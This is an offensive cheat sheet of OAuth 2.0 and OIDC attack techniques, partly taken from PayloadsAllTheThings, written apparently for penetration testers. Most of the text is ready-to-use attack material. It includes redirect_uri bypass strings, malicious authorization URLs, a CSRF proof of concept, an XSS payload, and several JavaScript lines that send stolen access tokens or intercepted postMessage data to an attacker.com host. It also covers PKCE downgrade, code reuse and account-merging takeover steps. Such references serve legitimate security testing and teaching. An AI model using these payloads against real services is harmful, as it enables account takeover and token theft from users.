OAuth 2.0 / OIDC Attacks

OAuth misconfigurations lead to account takeover, token theft, and privilege escalation. The attack surface spans redirect_uri validation, state parameter handling, token storage, and implicit flow leakage. OIDC adds identity claims — misbound accounts and token confusion attacks extend the impact.

OAuth Recon

# Discover OAuth endpoints:
curl https://target/.well-known/openid-configuration | jq .
curl https://target/.well-known/oauth-authorization-server | jq .
# Returns: authorization_endpoint, token_endpoint, jwks_uri, etc.

# Check authorization request parameters:
# In Burp: intercept login with "Sign in with Google/GitHub/etc."
# Look for: response_type, client_id, redirect_uri, scope, state, code_challenge

# Common OAuth flows:
# Authorization Code: code → exchange for token (most secure)
# Implicit: token returned directly in fragment (deprecated, insecure)
# Authorization Code + PKCE: code + code_verifier (SPA/mobile best practice)
# Client Credentials: machine-to-machine (no user)

Open Redirect via redirect_uri

If the auth server doesn't strictly validate redirect_uri, the authorization code gets sent to an attacker-controlled URL.

# Check validation strictness:
# Exact match (secure): only https://app.com/callback
# Path prefix (vulnerable): https://app.com/ANYTHING
# Regex bypass: https://app.com.attacker.com/

# Fuzzing redirect_uri:
# Append path: https://app.com/callback/../../evil
# Add open redirect: https://app.com/redirect?to=https://attacker.com
# Subdomain: https://attacker.app.com/callback
# URL encoded: https://app.com%2f@attacker.com/

# Exploit: craft malicious authorization URL:
https://auth.target.com/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://attacker.com/capture&
  scope=openid profile email&
  state=randomstate

# Victim clicks → code sent to attacker.com → exchange for token → ATO

State Parameter CSRF

If state is missing, predictable, or not validated — CSRF attack can link victim's account to attacker's OAuth identity.

# Attack flow (account linking CSRF):
# 1. Attacker initiates OAuth flow with their social account
# 2. Gets authorization URL with code (or stops before redirect)
# 3. Tricks victim into visiting attacker's authorization URL
# 4. Victim's session links to attacker's social account
# 5. Attacker logs in via their social account → accesses victim's account

# Detection: intercept OAuth callback — is state validated server-side?
# Test: modify state value → does server reject it?

# Exploit: drop state requirement or use predictable state
# CSRF PoC: <img src="https://target/oauth/callback?code=ATTACKER_CODE&state=PREDICTABLE">

Token Leakage via Referrer

# Implicit flow: token in URL fragment (#access_token=...)
# If page has external resources (images, scripts), Referer header leaks fragment
# Modern browsers strip fragments in Referer, but JS can still read it

# Fragment exposure:
# Token in fragment survives client-side redirects
# JavaScript: window.location.hash → access_token

# Referer leakage in authorization code flow:
# If redirect_uri page logs Referer or embeds 3rd-party content:
# ?code=AUTH_CODE → Referer header sent with code to 3rd party

# Open redirect chained with leakage:
# redirect_uri → open redirect → attacker page receives code in Referer

PKCE Bypass / Downgrade

PKCE (Proof Key for Code Exchange) prevents code interception attacks. Bypass if server doesn't enforce it.

# PKCE flow:
# Client generates: code_verifier (random), code_challenge = SHA256(code_verifier)
# Sends: code_challenge in authorization request
# Sends: code_verifier in token exchange
# Server verifies SHA256(code_verifier) == code_challenge

# Bypass 1: Server doesn't validate PKCE (optional when it should be required)
# Remove code_challenge from authorization request → code_verifier not checked

# Bypass 2: code_challenge_method=plain (no hashing)
# code_challenge == code_verifier → intercepted code sufficient

# Bypass 3: PKCE required but code reuse allowed
# Intercept code, replay with crafted code_verifier

# Test: intercept authorization request
# Remove code_challenge/code_challenge_method
# Proceed with token exchange without code_verifier
# → If tokens issued: PKCE not enforced

Account Takeover via Misbound OAuth

If the application links accounts by email without verifying ownership, register an OAuth identity with a victim's email to take over their account.

# Scenario 1: Pre-account takeover
# 1. Register normal account with victim@target.com (before victim registers)
# 2. Victim registers via OAuth with the same email
# 3. Application links OAuth to existing account → attacker controls it

# Scenario 2: OAuth account merging without verification
# 1. Log in as attacker
# 2. Link a social account that has victim's email
# 3. Application merges without re-verifying → attacker takes over

# Scenario 3: Password-reset via OAuth email claim
# If app trusts OAuth email claim without verification:
# Create OAuth app that returns arbitrary email in profile
# OAuth flow with email=admin@target.com → password reset sent/auto-login

# Scenario 4: JWT sub claim manipulation (OIDC)
# If sub claim is user-controlled and maps directly to user ID:
# Forge or manipulate sub → authenticate as any user

Token Theft via XSS

# If tokens stored in localStorage (common mistake):
# XSS → steal token directly:
<script>
fetch('https://attacker.com/steal?t='+localStorage.getItem('access_token'))
</script>

# If tokens in cookies with HttpOnly=false:
document.cookie → includes token

# sessionStorage also accessible via XSS:
sessionStorage.getItem('oauth_token')

# Best practice (defensively): tokens in HttpOnly cookies
# Red team: target apps storing OAuth tokens in localStorage

OAuth Attack Techniques

Additional attack techniques from PayloadsAllTheThings OAuth Misconfiguration reference.

Stealing Token via Referer / HTML Injection

# HTML injection without XSS — if img tag is injectable and OAuth is in use:
# 1. Find an HTML injection point on the app (e.g. profile name rendered as HTML)
# 2. Inject: <img src="https://attacker.com/steal">
# 3. Trick the victim to visit the page AFTER logging in via OAuth
# 4. The OAuth token/code may appear in the Referer header of the img request
# → Check attacker server logs for Authorization code in Referer

# Best targets for Referer leakage:
# - Any page where the OAuth callback code appears in the URL
# - Pages that embed third-party images/scripts after the OAuth redirect

Scope Manipulation

# Change scope to an invalid value to bypass redirect_uri filter:
https://target.com/admin/oauth/authorize?
  client_id=CLIENT_ID&
  scope=INVALID_SCOPE&
  redirect_uri=https://evil.com

# Expand scope to gain additional permissions:
# Original: scope=read
# Modified: scope=read+write+admin

# Downgrade scope then upgrade:
# 1. Authorize with minimal scope (passes review)
# 2. Replay token exchange with expanded scope parameter

Authorization Code Reuse

# RFC violation — authorization codes must only be used once.
# If server doesn't invalidate after first use:
# 1. Obtain authorization code via normal OAuth flow
# 2. Exchange for token (normal)
# 3. Replay the code exchange — if a second token is issued: vulnerable
# 4. All tokens issued from that code should be revoked per spec

# Test:
# Intercept the code in Burp
# Exchange once (normal)
# Repeat the POST /token request with same code
# If 200 with token: authorization code reuse enabled

OAuth Redirect URI Bypass

redirect_uri validation bypass techniques from PayloadsAllTheThings.

# Redirect to attacker-controlled domain:
redirect_uri=https://localhost.evil.com
redirect_uri=https://attacker.com

# Redirect via open redirect on the target app:
redirect_uri=https://app.com/redirect?url=https://attacker.com
redirect_uri=https://app.com/logout?next=https://attacker.com

# Redirect via whitelisted open redirect (accepted domain has open redirect):
redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
redirect_uri=https://apps.facebook.com/attacker/

# Scope trick — change scope to bypass redirect_uri filter:
https://target.com/oauth/authorize?client_id=X&scope=INVALID&redirect_uri=https://evil.com

# Path traversal in redirect_uri:
redirect_uri=https://app.com/callback/../../evil
redirect_uri=https://app.com/callback%2F%2E%2E%2Fevil

# Subdomain takeover chain:
# 1. Find subdomain pointing to unclaimed hosting (app.attacker-controlled.target.com)
# 2. Use as redirect_uri: redirect_uri=https://unclaimed.target.com/callback

# XSS via redirect_uri state parameter:
https://target.com/oauth/authorize?client_id=X&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>

OAuth Token Theft

Token exfiltration scenarios from PayloadsAllTheThings.

# Token in URL fragment (implicit flow):
# fragment (#access_token=...) is not sent to servers in Referer
# BUT: can be read by JavaScript on same page
# If page embeds attacker JS or has XSS: steal fragment directly
location.hash.substring(1)   # gets everything after #

# Implicit flow token leakage via postMessage:
# If the app uses postMessage to pass tokens to child windows:
window.addEventListener('message', function(e) {
  fetch('https://attacker.com/steal?t=' + JSON.stringify(e.data));
});

# localStorage token theft via XSS:
fetch('https://attacker.com/steal?t=' + localStorage.getItem('access_token'))

# Intercept token via Referer — chain with open redirect:
# OAuth redirect → open redirect on app → attacker page
# attacker page receives the code in the Referer header
# Works when: app has open redirect + redirect_uri accepts path prefix

# Force re-authorization to capture fresh code:
# If prompt=none doesn't apply, victim may re-auth without noticing
https://provider.com/oauth/authorize?client_id=X&redirect_uri=attacker&prompt=none
